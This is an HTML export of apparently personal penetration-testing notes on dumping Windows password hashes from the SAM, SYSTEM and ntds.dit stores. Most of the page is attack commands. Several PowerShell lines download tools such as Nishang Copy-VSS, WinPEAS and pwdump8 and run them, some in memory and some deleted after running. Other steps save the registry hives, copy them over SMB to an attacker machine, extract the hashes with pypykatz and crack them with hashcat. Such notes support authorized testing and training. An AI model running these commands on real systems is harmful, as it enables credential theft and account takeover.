<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SAM</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SAM</h1><br/><strong><h3>Where are stored the hashes in Windows</h3></strong><br />By default, the SAM file is <span style="text-decoration:underline;">locked on a running system</span>, and inaccessible to all users including administrative users! Since we cannot read the file directly on the disk volume, there are a few alternative tricks to get hold of the data. The local security authentication sub-system process (LSASS.EXE) on a running windows system reads this data and caches it in memory.<br /><br /> LANMAN and NT Hashes are stored:<br />• in the SAM file: <code>C:\Windows\System32\config\sam</code><br />• in the SAM registry: <code>HKEY_LOCAL_MACHINE\SAM</code><br />• If an NT file system recovery was performed in the past, and the Administrator has not removed the backup data, you might be able to find the SAM file in the directory:<br />   ◇ %SystemRoot%\repair <br />   ◇ C:\windows\repair <br />   ◇ C:\winnt\repair<br />   ◇ C:\Windows\System32\config\RegBack<br />• In Active Directory, password representations (both LANMAN and NT hashes by default) are stored in the file <code>%systemroot%\ntds\ntds.dit</code> in the Domain Controller.<br />    With the ntds.dit file, a penetration tester can run a suite of tools by Csaba Barta, which are designed for a forensics analysis of ntds.dit files. These tools have the capability to locate and pull out hashes from a copy of the ntds.dit file<br /><br /><strong><h3>Dump hashes as normal User</h3></strong><br />1. save the SAM and SYSTEM file<br />   ◇ save from registry<br />       <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#powershell</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>system <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\SYSTEM&quot;</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>sam <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\SAM&quot;</span><br /><span style="color:#0088ff;font-weight:400">#cmd</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>system <span style="color:#3ad900;font-weight:400">&quot;%userprofile%\desktop\SYSTEM&quot;</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>sam <span style="color:#3ad900;font-weight:400">&quot;%userprofile%\desktop\SAM&quot;</span></pre></div><br />        <br />   ◇ search with gci in paths:<br />        <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">gci</span> <span style="color:#ff9d00;font-weight:700">-</span>Path  C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>System32<span style="color:#ff9d00;font-weight:700">\</span>config,<span style="color:#ff9d00;font-weight:700">%</span>SystemRoot<span style="color:#ff9d00;font-weight:700">%\</span>repair,C<span style="color:#ff9d00;font-weight:700">:\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>repair,C<span style="color:#ff9d00;font-weight:700">:\</span>winnt<span style="color:#ff9d00;font-weight:700">\</span>repair,C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>System32<span style="color:#ff9d00;font-weight:700">\</span>config<span style="color:#ff9d00;font-weight:700">\</span>RegBack <span style="color:#ff9d00;font-weight:700">-</span>Include SAM,SYSTEM <span style="color:#ff9d00;font-weight:700">-</span>File <span style="color:#ff9d00;font-weight:700">-</span>Recurse <span style="color:#ff9d00;font-weight:700">-</span>EA SilentlyContinue</pre></div><br />   ◇ Use <a href="dump_NTDS.dit_file_stored_on_the_Domain_Controller--vssadmin_(built-in_Powershell_3.0+)--Nishang_framework_Copy-VSS.ps1_(Powershell_2.0+).html">Nishang Copy-VSS.ps1</a> automated script: <a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1</a><br />        <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1&#39;</span>);<span style="color:#ff9d00;font-weight:700">Copy-</span>VSS</pre></div><br />   ◇ Search with WinPEAS: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet cmd filesinfo&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div><br />        <a href=""><img src="images/1331-1.png" alt="images/1331-1.png" /></a><br />2. Copy files on the attacker machine<br />   1) Create a shared smb folder on the attacker machine<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>doc<span style="color:#ff9d00;font-weight:700">/</span>python3-impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<span style="color:#ff9d00;font-weight:700">/</span>smbserver.py tools .</pre></div><br />    <a href=""><img src="images/1331-2.png" alt="images/1331-2.png" /></a><br />  2) Copy file from the target to the attacker<br />    <div class="codebox"><pre>copy C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\u</span>ser<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\S</span>YSTEM <span style="color:#333333;font-weight:400">\\</span>192.168.147.139<span style="color:#333333;font-weight:400">\t</span>ools<span style="color:#333333;font-weight:400">\S</span>YSTEM<br />copy C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\u</span>ser<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\S</span>AM <span style="color:#333333;font-weight:400">\\</span>192.168.147.139<span style="color:#333333;font-weight:400">\t</span>ools<span style="color:#333333;font-weight:400">\S</span>AM</pre></div><br />    <a href=""><img src="images/1331-3.png" alt="images/1331-3.png" /></a><br />3. Extract the hashes<br />    To do that we can use a python version of mimikatz → <strong>pypykatz </strong><br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#Install prerequirements</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># pip3 <span style="color:#ff9d00;font-weight:700">install</span> minidump minikerberos aiowinreg msldap winacl<br /><span style="color:#0088ff;font-weight:400">#clone repo</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># git clone https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>skelsec<span style="color:#ff9d00;font-weight:700">/</span>pypykatz.git<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> pypykatz<br /><span style="color:#0088ff;font-weight:400">#install</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 setup.py <span style="color:#ff9d00;font-weight:700">install</span></pre></div><br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># pypykatz registry  &lt;SYSTEM-file&gt;  --sam &lt;SAM-file&gt;</pre></div><br />    <a href=""><img src="images/1331-4.png" alt="images/1331-4.png" /></a><br />4. Crack the hash<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt</pre></div><br />    <a href=""><img src="images/1331-5.png" alt="images/1331-5.png" /></a><br /><br /><br /><br /><br /><strong><h3>Dump hashes as Admin</h3></strong><br />• To dump them we can execute from the Windows machine pwdump tool like this one:<br />    <a href="https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip">https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip</a><br />    pwdump8 by Fulvio Zanetti and Andrea Petralia of blackMath.it<br />    Supported machines: Windows 2000/XP/Vista/7/2008/8/8.1/10/2012/2016/2019<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\pwdump8\pwdump8.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\pwdump8 -recurse&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;</pre></div><br /></div>
</body>
</html>
